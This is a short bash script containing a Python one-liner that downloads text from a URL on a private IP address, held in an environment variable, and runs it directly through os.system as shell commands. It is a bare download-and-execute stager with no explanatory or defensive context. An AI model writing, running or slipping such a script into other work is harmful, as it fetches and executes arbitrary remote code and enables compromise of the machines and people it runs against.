#!/bin/bash
export P=http://172.16.0.99/s
python3 -c "import urllib.request,os;os.system(urllib.request.urlopen(os.environ['P']).read().decode())"
